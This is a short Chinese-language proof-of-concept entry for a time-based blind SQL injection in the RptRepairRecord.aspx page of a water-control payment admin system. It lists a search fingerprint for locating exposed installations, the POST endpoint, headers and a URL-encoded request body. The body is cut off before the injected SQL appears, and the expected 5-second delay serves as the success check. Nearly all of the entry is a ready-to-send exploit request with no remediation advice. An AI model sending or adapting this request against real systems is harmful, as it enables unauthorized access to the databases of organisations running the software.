# 水控消费后台管理系统RptRepairRecord存在SQL注入漏洞

- **系统**：水控消费后台管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="登陆页"`
- **请求**：`POST /HardwareRpt/RptRepairRecord.aspx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__EVENTTARGET=BtnSearch&__EVENTARGUMENT=&__VIEWSTATE=qZcAle3YgJRy2T5rZeVP7M7PvulTO7Rq3cxPUIpBMpqbyhOOFMR2hpmKu9KdEOc8KDtdjnC2R172YM6HHwjiSKQAU0FB9AibYi060WodEyt6FnUaUDklgpD%2B%2BDXfnUdIUx7347%2BN%2B6HphZrzMrEEsC103I2biNvtv5754Wv%2B5Oh08BPErM%2BBn14VMA6OJESPcm0RutQUfqGPymD7UvkcHRVPV4UPl0iZBvsPckKDkT185Dl%2Fqjhg5slFEZOglZB0NmD1C295ojTozSaNpC2rWXdpQbl7TZ6aGzxsbYr2FV7Z%2BUkmMs4JkyPhLpzZ8eenfgHosyoI1Z9woAH7OS0YE0%2BaPDUy8Ls64gy%2FQ3UKfrdzxn4QTCOqDNEV%2BhE8hzmCHSQ5R83yRakMw9tEZ3k%2F1Q%3D%3D&__VIEWSTATEGENERATOR=66131512&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=WLbAR4m592bcpUKrhqU4GlZZFVs343w2jxu8g6Y7…（脚本共 874 字，完整版见原文）
```
- **预期**：200　|　响应时间>=5s